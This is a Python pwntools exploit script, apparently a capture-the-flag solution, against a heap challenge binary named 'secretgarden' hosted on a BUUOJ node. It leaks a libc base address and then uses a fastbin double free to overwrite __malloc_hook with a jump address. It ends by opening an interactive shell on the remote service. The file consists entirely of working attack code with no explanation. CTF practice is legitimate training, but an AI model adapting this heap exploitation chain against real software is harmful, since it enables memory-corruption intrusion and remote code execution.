#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/30 11:01:00
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
file_name = "./secretgarden"
menu = "Your choice : "
if context.arch == "amd64":
    libc_path = "/lib/x86_64-linux-gnu/libc.so.6"
    one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
    # libc_path = "../../libc/16-64-libc-2.23.so"
    # one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
else:
    # libc_path = "../../libc/16-32-libc-2.23.so"
    libc_path = "/lib/i386-linux-gnu/libc.so.6"
libc = ELF(libc_path)
if debug:
    if context.arch == "amd64":
        # sh = process([file_name],env={'LD_PRELOAD':libc_path})
        sh = process(file_name)
    else:
        # sh = process([file_name],env={'LD_PRELOAD':libc_path})
        sh = process(file_name)
else:
    IP = "node4.buuoj.cn"
    port = 27380
    sh = remote(IP,port)
def debug():
    gdb.attach(sh)
    pause()
def cmd(choice):
    sh.recvuntil(menu)
    sh.sendline(str(choice))

def add(size,name,color):
    cmd(1)
    sh.recvuntil("Length of the name :")
    sh.sendline(str(size))
    sh.recvuntil("The name of flower :")
    sh.send(name)
    sh.recvuntil("The color of the flower :")
    sh.sendline(color)

def show():
    cmd(2)

def dele(idx):
    cmd(3)
    sh.recvuntil("Which flower do you want to remove from the garden:")
    sh.sendline(str(idx))

def clean():
    cmd(4)

ptr = 0x6020c0
back_addr = 0x400C5E
add(0xf0,'a\n',"read")
add(0x10,'a\n',"read")
add(0x60,'a\n',"read")
add(0x60,'a\n',"read")
add(0x10,'a\n',"read")
dele(0)
add(0xc0,"a"*8,'a')
show()
libc_base = u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00")) - 0x3c4b78
log.info("libc_base=>{}".format(hex(libc_base)))
malloc_hook = libc_base + libc.symbols['__malloc_hook']
log.info("malloc_hook=>{}".format(hex(malloc_hook)))
# pause()
dele(2)
dele(3)
dele(2)

add(0x60,p64(malloc_hook-0x23),'a')
add(0x60,p64(0),'a')
add(0x60,p64(0),'a')
add(0x60,"\x00"*0x13 + p64(back_addr),'a')
cmd(1)
sh.interactive()